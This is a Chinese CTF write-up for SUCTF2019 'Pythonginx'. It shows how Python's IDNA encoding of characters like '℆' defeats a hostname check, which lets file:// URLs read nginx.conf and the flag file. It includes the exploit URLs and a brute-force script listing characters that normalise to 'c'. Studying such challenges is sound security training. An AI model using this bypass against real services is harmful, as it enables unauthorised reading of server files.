---
title: SUCTF2019-Pythonginx
date: 2025-03-30 20:21:20
tags:
- idna编码特性
- python代码审计
- nginx
category:
- 刷题笔记
---

# SUCTF2019-Pythonginx

[参考文章](https://blog.csdn.net/m0_62879498/article/details/124725500?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-124725500-blog-125823231.235^v43^pc_blog_bottom_relevance_base4&spm=1001.2101.3001.4242.1&utm_relevant_index=2)

源码：

```
@app.route('/getUrl', methods=['GET', 'POST']) 
def getUrl(): 
    url = request.args.get("url") 
    host = parse.urlparse(url).hostname  #解析主机名
    if host == 'suctf.cc': 
        return "我扌 your problem? 111" 
    parts = list(urlsplit(url)) 
    host = parts[1] 
    if host == 'suctf.cc': 
        return "我扌 your problem? 222 " + host 
    newhost = [] 
    for h in host.split('.'): 
        newhost.append(h.encode('idna').decode('utf-8')) 
        parts[1] = '.'.join(newhost) #去掉 url 中的空格 
        finalUrl = urlunsplit(parts).split(' ')[0] # 将主机名再次组合成 url
        host = parse.urlparse(finalUrl).hostname 
        if host == 'suctf.cc': 
            return urllib.request.urlopen(finalUrl).read() 
        else: 
            return "我扌 your problem? 333" 

```

我们需要提交一个url，用来读取服务器端任意文件，需要绕过前面两个if，进入第三个if
三个if判断的都是host是否等于’suctf.cc’

首先需要了解一些

## 知识点

### urlsplit()

```
urllib.parse.urlsplit(url)：这个函数将一个 URL 解析为以下五个部分：
    scheme：URL 的协议部分，如 http, https 等。
    netloc：URL 的网络位置部分，通常是主机名和端口号的组合。
    path：URL 的路径部分。
    query：URL 的查询参数部分。
    fragment：URL 的片段部分，即在页面内部定位用的锚点。
    
例如，对于 URL "https://www.example.com/path/to/resource?query=1#fragment"，urlsplit 将解析为：
    scheme 是 "https"
    netloc 是 "www.example.com"
    path 是 "/path/to/resource"
    query 是 "query=1"
    fragment 是 "fragment"

```

### nginx文件位置

```
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf
```

### idna

```
dna 国际化域名应用，国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以
ASCII字符串存储。
.
℆这个字符,如果使用python3进行idna编码的话
print(‘℆’.encode(‘idna’))
结果
b’c/u’
如果再使用utf-8进行解码的话
print(b’c/u’.decode(‘utf-8’))
结果
c/u
通过这种方法可以绕过本题
```

---

所以
我们可以利用python3进行idna编码这一特性 对配置文件目录进行访问

```
getUrl?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf
```

查到/fffffflag文件

---

访问 flag
对 ℆ 进行 url编码 `%E2%84%86`

```
file://suctf.c%E2%84%86sr/fffffflag
```

还能用脚本爆破能够encode成c的特殊字符

大佬脚本：

```
from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url="http://suctf.c{}".format(uni)
        try:
            if getUrl(url):
                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
        except:
            pass


def getUrl(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False

if __name__=="__main__":
    get_unicode()


```

输出

```
爆破出
str: ℂ unicode: \u2102
str: ℭ unicode: \u212d
str: Ⅽ unicode: \u216d
str: ⅽ unicode: \u217d
str: Ⓒ unicode: \u24b8
str: ⓒ unicode: \u24d2
str: Ｃ unicode: \uff23
str: ｃ unicode: \uff43
```

